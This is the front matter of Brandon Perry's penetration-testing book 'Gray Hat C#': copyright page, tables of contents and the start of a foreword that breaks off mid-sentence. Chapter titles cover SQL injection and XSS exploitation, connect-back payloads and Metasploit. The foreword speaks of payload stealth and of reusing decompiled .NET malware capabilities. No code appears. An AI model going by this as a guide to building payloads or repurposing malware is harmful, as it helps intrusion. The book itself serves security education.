[
  {
    "start": 1,
    "end": 5,
    "text": "Gray Hat C#\nG r a y H a t C #\na Hacker’s Guide to\nCreating and automating\nSecurity tools\nby Brandon Perry\nSan Francisco\nGray Hat C#. Copyright © 2017 by Brandon Perry.\nAll rights reserved. No part of this work may be reproduced or transmitted in any form or by any means,\nelectronic or mechanical, including photocopying, recording, or by any information storage or retrieval\nsystem, without the prior written permission of the copyright owner and the publisher.\nISBN-10: 1-59327-759-8\nISBN-13: 978-1-59327-759-8\nPublisher: William Pollock\nProduction Editors: Alison Law and Serena Yang\nCover Illustration: Jonny Thomas\nInterior Design: Octopod Studios\nDevelopmental Editors: William Pollock and Jan Cash\nTechnical Reviewer: Brian Rogers\nCopyeditor: Barton D. Reed\nCompositor: Susan Glinert Stevens\nProofreader: Paula L. Fleming\nIndexer: BIM Creatives, LLC.\nFor information on distribution, translations, or bulk sales, please contact No Starch Press, Inc. directly:\nNo Starch Press, Inc.\n245 8th Street, San Francisco, CA 94103\nphone: 1.415.863.9900; sales@nostarch.com\nwww.nostarch.com\nLibrary of Congress Cataloging-in-Publication Data\nNames: Perry, Brandon, author.\nTitle: Gray hat C# : a hacker's guide to creating and automating security tools / Brandon Perry.\nDescription: San Francisco : No Starch Press, Inc., [2017]\nIdentifiers: LCCN 2017002556 (print) | LCCN 2017005221 (ebook) | ISBN\n9781593277598 (pbk.) | ISBN 1593277598 (pbk.) | ISBN 9781593278311 (epub)\n| ISBN 1593278314 (epub) | ISBN 9781593278328 ( mobi) | ISBN 1593278322\n(mobi)\nSubjects: LCSH: C# (Computer program language) | Automatic control--Computer\nprograms. | Computer security.\nClassification: LCC QA76.73.C154 P44 2017 (print) | LCC QA76.73.C154 (ebook)\n| DDC 005.8--dc23\nLC record available at https://lccn.loc.gov/2017002556\nNo Starch Press and the No Starch Press logo are registered trademarks of No Starch Press, Inc. Other\nproduct and company names mentioned herein may be the trademarks of their respective owners. Rather\nthan use a trademark symbol with every occurrence of a trademarked name, we are using the names only\nin an editorial fashion and to the benefit of the trademark owner, with no intention of infringement of the\ntrademark.\nThe information in this book is distributed on an “As Is” basis, without warranty. While every precaution\nhas been taken in the preparation of this work, neither the author nor No Starch Press, Inc. shall have any\nliability to any person or entity with respect to any loss or damage caused or alleged to be caused directly or\nindirectly by the information contained in it.\nBrief ContentS\nForeword by Matt Graeber . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xiii\nPreface . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xvii\nChapter 1: C# Crash Course . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1\nChapter 2: Fuzzing and Exploiting XSS and SQL Injection  . . . . . . . . . . . . . . . . . . . . . 15\nChapter 3: Fuzzing SOAP Endpoints  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 53\nChapter 4: Writing Connect-Back, Binding, and Metasploit Payloads . . . . . . . . . . . . . . 81\nChapter 5: Automating Nessus  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 103\nChapter 6: Automating Nexpose . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 115\nChapter 7: Automating OpenVAS  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 133\nChapter 8: Automating Cuckoo Sandbox  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 147\nChapter 9: Automating sqlmap  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 167\nChapter 10: Automating ClamAV  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 191\nChapter 11: Automating Metasploit . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 207\nChapter 12: Automating Arachni . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 223\nChapter 13: Decompiling and Reversing Managed Assemblies . . . . . . . . . . . . . . . . . 241\nChapter 14: Reading Offline Registry Hives  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 249\nIndex  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 265\nContentS in De tail\nFOrewOrd by Matt Graeber xii\nPreFaCe xvii\nWhy Should I Trust Mono?  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xviii\nWho Is This Book For?  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .xviii\nOrganization of This Book  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xix\nAcknowledgments  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxi\nA Final Note  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxi\n1\nC# CraSH COurSe 1\nChoosing an IDE  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1\nA Simple Example  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2\nIntroducing Classes and Interfaces  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 4\nCreating a Class . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nCreating an Interface . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\nSubclassing from an Abstract Class and Implementing an Interface . . . . . . . . . . 5\nTying Everything Together with the Main() Method  . . . . . . . . . . . . . . . . . . . . . 7\nRunning the Main() Method  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8\nAnonymous Methods  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\nAssigning a Delegate to a Method  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\nUpdating the Firefighter Class . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\nCreating Optional Arguments . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10\nUpdating the Main() Method  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11\nRunning the Updated Main() Method . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12\nIntegrating with Native Libraries  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\n2\nFuzzinG and exPLOitinG xSS and SQL injeCtiOn 15\nSetting Up the Virtual Machine  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\nAdding a Host-Only Virtual Network . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16\nCreating the Virtual Machine  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17\nBooting the Virtual Machine from the BadStore ISO . . . . . . . . . . . . . . . . . . . . 17\nSQL Injections  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19\nCross-Site Scripting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\nFuzzing GET Requests with a Mutational Fuzzer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22\nTainting the Parameters and Testing for Vulnerabilities . . . . . . . . . . . . . . . . . . 23\nBuilding the HTTP Requests . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\nTesting the Fuzzing Code . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25\nFuzzing POST Requests . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25\nWriting a POST Request Fuzzer  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\nThe Fuzzing Begins . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28\nFuzzing Parameters . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\nFuzzing JSON . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\nSetting Up the Vulnerable Appliance . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\nCapturing a Vulnerable JSON Request  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\nCreating the JSON Fuzzer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33\nTesting the JSON Fuzzer  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37\nExploiting SQL Injections . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\nPerforming a UNION-Based Exploit by Hand . . . . . . . . . . . . . . . . . . . . . . . . 38\nPerforming a UNION-Based Exploit Programmatically . . . . . . . . . . . . . . . . . . 40\nExploiting Boolean-Blind SQL Vulnerabilities . . . . . . . . . . . . . . . . . . . . . . . . . 43\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 51\n3\nFuzzinG SOaP endPOintS 53\nSetting Up the Vulnerable Endpoint  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 54\nParsing the WSDL  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 55\nCreating a Class for the WSDL Document  . . . . . . . . . . . . . . . . . . . . . . . . . . 55\nWriting the Initial Parsing Methods  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56\nWriting a Class for the SOAP Type and Parameters  . . . . . . . . . . . . . . . . . . . 58\nCreating the SoapMessage Class to Define Sent Data . . . . . . . . . . . . . . . . . . 60\nImplementing a Class for Message Parts  . . . . . . . . . . . . . . . . . . . . . . . . . . . 61\nDefining Port Operations with the SoapPortType Class . . . . . . . . . . . . . . . . . . 62\nImplementing a Class for Port Operations . . . . . . . . . . . . . . . . . . . . . . . . . . . 63\nDefining Protocols Used in SOAP Bindings . . . . . . . . . . . . . . . . . . . . . . . . . . 64\nCompiling a List of Operation Child Nodes  . . . . . . . . . . . . . . . . . . . . . . . . . 65\nFinding the SOAP Services on Ports . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 66\nAutomatically Fuzzing the SOAP Endpoint for SQL Injection Vulnerabilities . . . . . . . . . . 68\nFuzzing Individual SOAP Services . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69\nFuzzing the HTTP POST SOAP Port  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 72\nFuzzing the SOAP XML Port  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 75\nRunning the Fuzzer  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 78\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79\n4\nwritinG COnneCt-BaCk, BindinG,\nand MetaSPLOit PayLOadS 81\nCreating a Connect-Back Payload  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82\nThe Network Stream  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82\nRunning the Command  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84\nRunning the Payload  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 85\nBinding a Payload  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 85\nAccepting Data, Running Commands, and Returning Output  . . . . . . . . . . . . . 86\nExecuting Commands from the Stream . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 87\nUsing UDP to Attack a Network . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 88\nThe Code for the Target’s Machine  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 89\nThe Attacker’s Code  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 92\nRunning x86 and x86-64 Metasploit Payloads from C#  . . . . . . . . . . . . . . . . . . . . . . . 94\nSetting Up Metasploit  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 94\nGenerating Payloads . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 96\nviii Contents in Detail\nExecuting Native Windows Payloads as Unmanaged Code . . . . . . . . . . . . . . 96\nExecuting Native Linux Payloads . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 98\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 102\n5\nautOMatinG neSSuS 103\nREST and the Nessus API  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104\nThe NessusSession Class . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 105\nMaking the HTTP Requests  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 106\nLogging Out and Cleaning Up  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 107\nTesting the NessusSession Class  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 108\nThe NessusManager Class  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 109\nPerforming a Nessus Scan . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 110\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 113\n6\nautOMatinG nexPOSe 115\nInstalling Nexpose . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 116\nActivation and Testing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 117\nSome Nexpose Parlance  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 118\nThe NexposeSession Class  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 118\nThe ExecuteCommand() Method  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 120\nLogging Out and Disposing of Our Session  . . . . . . . . . . . . . . . . . . . . . . . . 123\nFinding the API Version  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 123\nDriving the Nexpose API  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 124\nThe NexposeManager Class . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 124\nAutomating a Vulnerability Scan  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 126\nCreating a Site with Assets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 126\nStarting a Scan . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 127\nCreating a PDF Site Report and Deleting the Site  . . . . . . . . . . . . . . . . . . . . . . . . . . . 128\nPutting It All Together  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 128\nStarting the Scan . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 129\nGenerating a Report and Deleting the Site . . . . . . . . . . . . . . . . . . . . . . . . . 129\nRunning the Automation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 130\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 131\n7\nautOMatinG OPenVaS 133\nInstalling OpenVAS  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 134\nBuilding the Classes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 134\nThe OpenVASSession Class  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 134\nAuthenticating with the OpenVAS Server . . . . . . . . . . . . . . . . . . . . . . . . . . 135\nCreating a Method to Execute OpenVAS Commands  . . . . . . . . . . . . . . . . . 136\nReading the Server Message  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 137\nSetting Up the TCP Stream to Send and Receive Commands . . . . . . . . . . . . . 138\nCertificate Validation and Garbage Collection . . . . . . . . . . . . . . . . . . . . . . 138\nGetting the OpenVAS Version  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 139\nContents in Detail ix\nThe OpenVASManager Class  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 140\nGetting Scan Configurations and Creating Targets  . . . . . . . . . . . . . . . . . . . 141\nWrapping Up the Automation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 144\nRunning the Automation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 145\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 146\n8\nautOMatinG CuCkOO SandBOx 147\nSetting Up Cuckoo Sandbox  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 148\nManually Running the Cuckoo Sandbox API  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 148\nStarting the API . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 148\nChecking Cuckoo’s Status  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 149\nCreating the CuckooSession Class . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 151\nWriting the ExecuteCommand() Methods to Handle HTTP Requests  . . . . . . . . 151\nCreating Multipart HTTP Data with the GetMultipartFormData() Method . . . . . 153\nProcessing File Data with the FileParameter Class  . . . . . . . . . . . . . . . . . . . . 155\nTesting the CuckooSession and Supporting Classes . . . . . . . . . . . . . . . . . . . 156\nWriting the CuckooManager Class  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 157\nWriting the CreateTask() Method  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 157\nThe Task Details and Reporting Methods  . . . . . . . . . . . . . . . . . . . . . . . . . . 159\nCreating the Task Abstract Class . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 160\nSorting and Creating Different Class Types . . . . . . . . . . . . . . . . . . . . . . . . . 161\nPutting It Together  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 163\nTesting the Application . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 164\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 165\n9\nautOMatinG SQLMaP 167\nRunning sqlmap . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 168\nThe sqlmap REST API . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 169\nTesting the sqlmap API with curl  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 170\nCreating a Session for sqlmap . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 173\nCreating a Method to Execute a GET Request . . . . . . . . . . . . . . . . . . . . . . . 174\nExecuting a POST Request  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 175\nTesting the Session Class  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 176\nThe SqlmapManager Class . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 177\nListing sqlmap Options . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 179\nMaking a Method to Perform Scans . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180\nThe New Main() Method  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 182\nReporting on a Scan . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 182\nAutomating a Full sqlmap Scan  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 183\nIntegrating sqlmap with the SOAP Fuzzer  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 185\nAdding sqlmap GET Request Support to the SOAP Fuzzer  . . . . . . . . . . . . . . 185\nAdding sqlmap POST Request Support . . . . . . . . . . . . . . . . . . . . . . . . . . . . 187\nCalling the New Methods  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 188\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 190\nx Contents in Detail\n10\nautOMatinG CLaMaV 191\nInstalling ClamAV  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 192\nThe ClamAV Native Library vs . the clamd Network Daemon  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 193\nAutomating with ClamAV’s Native Library . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 193\nSetting Up the Supporting Enumerations and Classes . . . . . . . . . . . . . . . . . . 194\nAccessing ClamAV’s Native Library Functions . . . . . . . . . . . . . . . . . . . . . . . 196\nCompiling the ClamAV Engine  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 197\nScanning Files  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 198\nCleaning Up . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 200\nTesting the Program by Scanning the EICAR File . . . . . . . . . . . . . . . . . . . . . 200\nAutomating with clamd . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 201\nInstalling the clamd Daemon . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 202\nStarting the clamd Daemon  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 202\nCreating a Session Class for clamd . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203\nCreating a clamd Manager Class . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 204\nTesting with clamd  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 205\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 206\n11\nautOMatinG MetaSPLOit 207\nRunning the RPC Server  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 208\nInstalling Metasploitable . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nGetting the MSGPACK Library . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209\nInstalling the NuGet Package Manager for MonoDevelop  . . . . . . . . . . . . . . 210\nInstalling the MSGPACK Library  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 211\nReferencing the MSGPACK Library  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 211\nWriting the MetasploitSession Class . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212\nCreating the Execute() Method for HTTP Requests and\nInteracting with MSGPACK  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213\nTransforming Response Data from MSGPACK . . . . . . . . . . . . . . . . . . . . . . . 215\nTesting the session Class . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217\nWriting the MetasploitManager Class  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217\nPutting It All Together  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 219\nRunning the Exploit  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 220\nInteracting with the Shell  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 221\nPopping Shells  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 221\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 222\n12\nautOMatinG araCHni 223\nInstalling Arachni . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 223\nThe Arachni REST API . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 224\nCreating the ArachniHTTPSession Class . . . . . . . . . . . . . . . . . . . . . . . . . . . 225\nCreating the ArachniHTTPManager Class . . . . . . . . . . . . . . . . . . . . . . . . . . 226\nPutting the Session and Manager Classes Together  . . . . . . . . . . . . . . . . . . . . . . . . . 227\nContents in Detail xi\nThe Arachni RPC  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 228\nManually Running the RPC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 229\nThe ArachniRPCSession Class . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 230\nThe Supporting Methods for ExecuteCommand() . . . . . . . . . . . . . . . . . . . . . 232\nThe ExecuteCommand() Method  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 234\nThe ArachniRPCManager Class  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 236\nPutting It All Together  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 237\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 239\n13\ndeCOMPiLinG and reVerSinG ManaGed aSSeMBLieS 241\nDecompiling Managed Assemblies . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 242\nTesting the Decompiler  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 244\nUsing monodis to Analyze an Assembly  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 245\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 247\n14\nreadinG OFFLine reGiStry HiVeS 249\nThe Registry Hive Structure  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 250\nGetting the Registry Hives . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 250\nReading the Registry Hive . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 252\nCreating a Class to Parse a Registry Hive File . . . . . . . . . . . . . . . . . . . . . . . 252\nCreating a Class for Node Keys . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 253\nMaking a Class to Store Value Keys  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 258\nTesting the Library  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 259\nDumping the Boot Key  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 259\nThe GetBootKey() Method  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 259\nThe GetValueKey() Method . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 261\nThe GetNodeKey() Method  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 261\nThe StringToByteArray() Method  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 262\nGetting the Boot Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 262\nVerifying the Boot Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 263\nConclusion  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 264\nindex 265\nxii Contents in Detail\nfor e worD\nAs an attacker or defender developing software, one\nobviously needs to decide which language makes the\nmost sense to use. Ideally, a language won’t be chosen\nsimply because it is what the developer is most com-\nfortable with. Rather, a language should be chosen\nbased on answering a series of questions such as the\nfollowing:\n• What are my primary target execution environments?\n• What is the state of detection and logging for payloads written in this\nlanguage?\n• To what level does my software need to maintain stealth (for example,\nmemory residence)?\n• How well is the language supported for both the client side and the\nserver side?\n• Is there a sizable community developing in this language?\n• What is the learning curve and how maintainable is the language?\nC# has some compelling answers to these questions. As to the question\nabout the target execution environment, .NET should be an obvious can-\ndidate for consideration in a Microsoft-heavy environment because it has\nbeen packaged with Windows for years. However, with the open-sourcing\nof .NET, C# is now a language that can drive a mature runtime on every\noperating system. Naturally, it should be considered an extremely enticing\nlanguage for true cross-platform support.\nC# has always been the lingua franca of .NET languages. As you will\nsee in this book, you will get up and running with C# in no time thanks\nto its low barrier to entry and massive developer community. Additionally,\nwith .NET being a managed, type-rich language, compiled assemblies lend\nthemselves to being trivially decompiled to C#. Therefore, someone writing\noffensive C# need not necessarily develop their capabilities in a vacuum.\nRather, one can pull from a wealth of .NET malware samples, decompile\nthem, read the equivalent of their source code, and “borrow” their capa-\nbilities. They could even go so far as to employ the .NET reflection API to\nload and execute existing .NET malware samples dynamically—assuming,\nof course, they’ve been reversed sufficiently to ensure they do nothing\nsubversive.\nAs someone who has spent years bringing offensive PowerShell into\nthe mainstream, my efforts have brought about massive security improve-\nments and logging facilities in the wake of the surge of PowerShell mal-\nware. The latest version of PowerShell (v5 as of this writing) implements\nmore logging than any other scripting language in existence. From 